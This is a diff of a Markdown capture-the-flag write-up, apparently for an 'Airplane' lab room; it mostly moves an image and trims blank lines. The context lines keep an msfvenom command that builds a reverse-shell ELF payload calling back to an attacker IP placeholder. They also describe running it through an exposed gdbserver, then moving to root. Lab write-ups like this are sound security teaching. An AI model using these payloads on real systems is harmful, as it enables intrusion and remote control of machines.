@@ -461,6 +461,7 @@ then i generated a Linux x64 reverse-shell ELF payload:
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f elf -o airplane_payload.elf
 ```
+![ELF](./images/elf.jpg)
 
 ![MSF](./images/msf.jpg)
 
@@ -528,7 +529,6 @@ The payload was an ELF reverse-shell executable:
 ```text
 airplane_payload.elf
 ```
-
 The gdbserver executed the payload, causing the target machine to initiate a connection back to my Netcat listener.
 
 ---
@@ -589,12 +589,9 @@ cat /home/carlos/user.txt
 
 ![Curl SSH](./images/curl_ssh.jpg)
 
-![ELF](./images/elf.jpg)
-
 
 **WE FOUND THE USER FLAG**
 
----
 
 # 19. Privilege Escalation
 
@@ -705,6 +702,3 @@ root.txt
 # Conclusion
 
 This room teach us a realistic attack chain against a misconfigured system. We started with active reconnaissance using Nmap, discovered the web application, identified an LFI vulnerability, used `/proc` enumeration to identify the unknown service on port 6048, discovered gdbserver, obtained an initial shell, moved to Carlos, found the user flag, and continued with privilege escalation toward root.
-
-```
-```
